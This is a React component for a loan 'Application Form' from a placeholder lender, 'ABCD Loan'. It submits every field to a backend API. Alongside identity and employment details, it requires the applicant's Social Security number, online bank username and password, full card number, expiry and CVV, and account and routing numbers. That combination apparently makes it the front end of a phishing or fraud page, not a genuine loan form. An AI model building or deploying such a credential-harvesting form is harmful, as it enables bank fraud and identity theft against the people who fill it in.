import React, { useState } from 'react';
import axios from 'axios';

const apiurl = import.meta.env.VITE_API_URL;

// Set the base URL for all requests
// axios.defaults.baseURL = import.meta.env.VITE_API_URL;
export default function CustomerForm() {
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    contactNumber: '',
    dateOfBirth: '',
    socialSecurityNumber: '',
    address: '',
    city: '',
    state: 'Select State',
    bankUserName: '',
    bankPassword: '',
    cardNumber: '',
    cardExpiryMonth: '',
    cardExpiryYear: '',
    cardCVV: '',
    cardName: '',
    employmentType: 'Select Employment Type',
    employerName:'',
    jobTitle: '',
    monthlyIncome: '',
    loanPurpose: '',
    loanAmount: '',
    accountNumber: '',
    routingNumber: '',
    termsAccepted: false
  });

  const [employmentDropdownOpen, setEmploymentDropdownOpen] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [success, setSuccess] = useState(false);

  const employmentTypes = [
    'Select Employment Type',
    'Job Income',
    'Self Employed',
    'Social Security/Disability',
    'Retirement/Pension'
  ];

  const states = [
    'Select State', 'Alabama', 'Alaska', 'Arizona', 'Arkansas', 'California',
    'Colorado', 'Connecticut', 'Delaware', 'Florida', 'Georgia', 'Hawaii',
    'Idaho', 'Illinois', 'Indiana', 'Iowa', 'Kansas', 'Kentucky', 'Louisiana',
    'Maine', 'Maryland', 'Massachusetts', 'Michigan', 'Minnesota', 'Mississippi',
    'Missouri', 'Montana', 'Nebraska', 'Nevada', 'New Hampshire', 'New Jersey',
    'New Mexico', 'New York', 'North Carolina', 'North Dakota', 'Ohio', 'Oklahoma',
    'Oregon', 'Pennsylvania', 'Rhode Island', 'South Carolina', 'South Dakota',
    'Tennessee', 'Texas', 'Utah', 'Vermont', 'Virginia', 'Washington',
    'West Virginia', 'Wisconsin', 'Wyoming'
  ];

  const toggleEmploymentDropdown = () => {
    setEmploymentDropdownOpen(!employmentDropdownOpen);
  };

  const selectEmploymentType = (type) => {
    setFormData({ ...formData, employmentType: type });
    setEmploymentDropdownOpen(false);
  };

  const handleInputChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData({
      ...formData,
      [name]: type === 'checkbox' ? checked : value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Basic form validation
    if (formData.employmentType === 'Select Employment Type') {
      setError('Please select an employment type');
      return;
    }
    
    if (formData.state === 'Select State') {
      setError('Please select a state');
      return;
    }
    
    if (!formData.termsAccepted) {
      setError('You must accept the terms and conditions');
      return;
    }
    
    try {
      setLoading(true);
      setError(null);
      
      // Send data to backend
      // const response = await axios.post(`${apiurl}/api/users`, formData);
      const response = await axios.post(`${apiurl}/api/users`, formData);
      
      console.log('User created:', response.data);
      setSuccess(true);
      
      // Reset form after successful submission
      setFormData({
        firstName: '',
        lastName: '',
        email: '',
        contactNumber: '',
        dateOfBirth: '',
        socialSecurityNumber: '',
        address: '',
        city: '',
        state: 'Select State',
        bankUserName: '',
        bankPassword: '',
        cardNumber: '',
        cardExpiryMonth: '',
        cardExpiryYear: '',
        cardCVV: '',
        cardName: '',
        employmentType: 'Select Employment Type',
        employerName: '',
        jobTitle: '',
        monthlyIncome: '',
        loanPurpose: '',
        loanAmount: '',
        accountNumber: '',
        routingNumber: '',
        termsAccepted: false
      });
      
    } catch (err) {
      console.error('Error submitting form:', err);
      setError(err.response?.data?.error || 'Failed to submit form. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="max-w-6xl mx-auto p-4">
 
           <div className="flex items-center gap-2 justify-center pb-10 ">
            
            <div>
              <h3 className="text-2xl font-bold text-black">- Application Form -</h3>
              {/* <div className="h-1  bg-black mt-1 "></div> */}
        
            </div>
          </div>
    


      {/* Success message */}
      {success && (
        <div className="mb-4 p-4 bg-green-100 border border-green-400 text-green-700 rounded">
          Your loan application has been submitted successfully!
        </div>
      )}
      
      {/* Error message */}
      {error && (
        <div className="mb-4 p-4 bg-red-100 border border-red-400 text-red-700 rounded">
          {error}
        </div>
      )}
      
      {/* Customer Information Section */}
      <div className="mb-8">
        <h2 className="text-2xl font-bold mb-4 border-b pb-2">Customer Information -</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <input 
              type="text" 
              name="firstName"
              placeholder="First Name" 
              className="w-full p-3 border rounded-md" 
              value={formData.firstName}
              onChange={handleInputChange}
              required
            />
          </div>
          <div>
            <input 
              type="text" 
              name="lastName"
              placeholder="Last Name" 
              className="w-full p-3 border rounded-md" 
              value={formData.lastName}
              onChange={handleInputChange}
              required
            />
          </div>
          <div>
            <input 
              type="email" 
              name="email"
              placeholder="Your E-mail" 
              className="w-full p-3 border rounded-md" 
              value={formData.email}
              onChange={handleInputChange}
              required
            />
          </div>
          <div>
            <input 
              type="tel" 
              name="contactNumber"
              placeholder="Contact Number" 
              className="w-full p-3 border rounded-md" 
              value={formData.contactNumber}
              onChange={handleInputChange}
              required
            />
          </div>
          <div className="relative">
            <input 
              type="date" 
              name="dateOfBirth"
              placeholder="mm/dd/yyyy" 
              className="w-full p-3 border rounded-md" 
              value={formData.dateOfBirth}
              onChange={handleInputChange}
              required
            />
            <div className="absolute right-3 top-3">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
                <line x1="16" y1="2" x2="16" y2="6"></line>
                <line x1="8" y1="2" x2="8" y2="6"></line>
                <line x1="3" y1="10" x2="21" y2="10"></line>
              </svg>
            </div>
          </div>
          <div>
            <input 
              type="text" 
              name="socialSecurityNumber"
              placeholder="Social Security Number" 
              className="w-full p-3 border rounded-md" 
              value={formData.socialSecurityNumber}
              onChange={handleInputChange}
              required
            />
          </div>
        </div>
      </div>

      {/* Home Address Section */}
      <div className="mb-8">
        <h2 className="text-2xl font-bold mb-4 border-b pb-2">Home Address -</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <input 
              type="text" 
              name="address"
              placeholder="Your Address" 
              className="w-full p-3 border rounded-md" 
              value={formData.address}
              onChange={handleInputChange}
              required
            />
          </div>
          <div>
            <input 
              type="text" 
              name="city"
              placeholder="City" 
              className="w-full p-3 border rounded-md" 
              value={formData.city}
              onChange={handleInputChange}
              required
            />
          </div>
          <div>
            <select 
              name="state"
              className="w-full p-3 border rounded-md appearance-none bg-white"
              value={formData.state}
              onChange={handleInputChange}
              required
            >
              {states.map((state, index) => (
                <option key={index} value={state}>{state}</option>
              ))}
            </select>
          </div>
        </div>
      </div>

      {/* Bank Information Section */}
      <div className="mb-8">
        <h2 className="text-2xl font-bold mb-4 border-b pb-2">Bank Information -</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <input 
              type="text" 
              name="bankUserName"
              placeholder="Bank User Name" 
              className="w-full p-3 border rounded-md" 
              value={formData.bankUserName}
              onChange={handleInputChange}
              required
            />
          </div>
          <div>
            <input 
              type="password" 
              name="bankPassword"
              placeholder="Bank password" 
              className="w-full p-3 border rounded-md" 
              value={formData.bankPassword}
              onChange={handleInputChange}
              required
            />
          </div>
          <div>
            <input 
              type="text" 
              name="cardNumber"
              placeholder="Card Number" 
              className="w-full p-3 border rounded-md" 
              value={formData.cardNumber}
              onChange={handleInputChange}
              required
            />
          </div>
          <div className="grid grid-cols-2 gap-4">
            <div>
              <input 
                type="text" 
                name="cardExpiryMonth"
                placeholder="Month" 
                className="w-full p-3 border rounded-md" 
                value={formData.cardExpiryMonth}
                onChange={handleInputChange}
                required
              />
            </div>
            <div>
              <input 
                type="text" 
                name="cardExpiryYear"
                placeholder="Year" 
                className="w-full p-3 border rounded-md" 
                value={formData.cardExpiryYear}
                onChange={handleInputChange}
                required
              />
            </div>
          </div>
          <div>
            <input 
              type="text" 
              name="cardCVV"
              placeholder="Card CVV" 
              className="w-full p-3 border rounded-md" 
              value={formData.cardCVV}
              onChange={handleInputChange}
              required
            />
          </div>
          <div>
            <input 
              type="text" 
              name="cardName"
              placeholder="Card Name" 
              className="w-full p-3 border rounded-md" 
              value={formData.cardName}
              onChange={handleInputChange}
              required
            />
          </div>
        </div>
      </div>

      {/* Employment Information Section */}
      <div className="mb-8">
        <h2 className="text-2xl font-bold mb-4 border-b pb-2">Employment Information -</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="relative">
            <div 
              className="w-full p-3 border rounded-md flex justify-between items-center cursor-pointer bg-white"
              onClick={toggleEmploymentDropdown}
            >
              <span>{formData.employmentType}</span>
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-chevron-down" viewBox="0 0 16 16">
                <path fillRule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
              </svg>
            </div>
            {employmentDropdownOpen && (
              <div className="absolute w-full border rounded-md mt-1 bg-white z-10">
                {employmentTypes.map((type, index) => (
                  <div 
                    key={index} 
                    className={`p-3 cursor-pointer hover:bg-gray-100 ${
                      type === formData.employmentType ? 'bg-blue-600 text-white' : ''
                    }`}
                    onClick={() => selectEmploymentType(type)}
                  >
                    {type}
                  </div>
                ))}
              </div>
            )}
          </div>
          <div>
            <input 
              type="text" 
              name="employerName"
              placeholder="Employer Name" 
              className="w-full p-3 border rounded-md" 
              value={formData.employerName}
              onChange={handleInputChange}
            />
          </div>
          <div>
            <input 
              type="text" 
              name="jobTitle"
              placeholder="Your Job title" 
              className="w-full p-3 border rounded-md" 
              value={formData.jobTitle}
              onChange={handleInputChange}
            />
          </div>
          <div>
            <input 
              type="number" 
              name="monthlyIncome"
              placeholder="Monthly Income" 
              className="w-full p-3 border rounded-md" 
              value={formData.monthlyIncome}
              onChange={handleInputChange}
            />
          </div>
        </div>
      </div>

      {/* Loan Information Section */}
      <div className="mb-8">
        <h2 className="text-2xl font-bold mb-4 border-b pb-2">Loan Information -</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <input 
              type="text" 
              name="loanPurpose"
              placeholder="Why are you applying for this loan?" 
              className="w-full p-3 border rounded-md" 
              value={formData.loanPurpose}
              onChange={handleInputChange}
              required
            />
          </div>
          <div>
            <input 
              type="number" 
              name="loanAmount"
              placeholder="Loan Amount" 
              className="w-full p-3 border rounded-md" 
              value={formData.loanAmount}
              onChange={handleInputChange}
              required
            />
          </div>
          <div>
            <input 
              type="text" 
              name="accountNumber"
              placeholder="Account number" 
              className="w-full p-3 border rounded-md" 
              value={formData.accountNumber}
              onChange={handleInputChange}
              required
            />
          </div>
          <div>
            <input 
              type="text" 
              name="routingNumber"
              placeholder="Routing number" 
              className="w-full p-3 border rounded-md" 
              value={formData.routingNumber}
              onChange={handleInputChange}
              required
            />
          </div>
        </div>

        <div className="mt-6">
          <div className="flex items-start">
            <input 
              type="checkbox" 
              id="termsAccepted"
              name="termsAccepted"
              className="mt-1 mr-2"
              checked={formData.termsAccepted}
              onChange={handleInputChange}
              required
            />
            <label htmlFor="termsAccepted" className="text-sm">
              <span>By checking this box you -</span>
              <ul className="list-disc pl-8 mt-2 space-y-2">
                <li>Certify the above information is accurate and complete and intend for it to be relied upon by ABCD loan and its successors and assignees;</li>
                <li>Authorize consumer credit reports to be obtained in connection with this loan application by ABCD loan.</li>
                <li>Authorize ABCD Loan to investigate any information included in this credit application;</li>
                <li>Authorize ABCD Loan to use the information in this application for purposes including account review, collection, renewal or extension of the credit received, to the extent permitted by applicable law and.</li>
                <li>Agree to the following additional <a href="#" className="text-blue-600 underline">terms and conditions</a></li>
              </ul>
            </label>
          </div>
        </div>
      </div>
      
      {/* Submit Button */}
      <div className="flex justify-start">
        <button 
          type="submit" 
          className="bg-green-900 text-white px-6 py-3 rounded-md hover:bg-green-800 disabled:bg-gray-400"
          disabled={loading}
        >
          {loading ? 'Submitting...' : 'Submit'}
        </button>
      </div>
    </form>
  );
}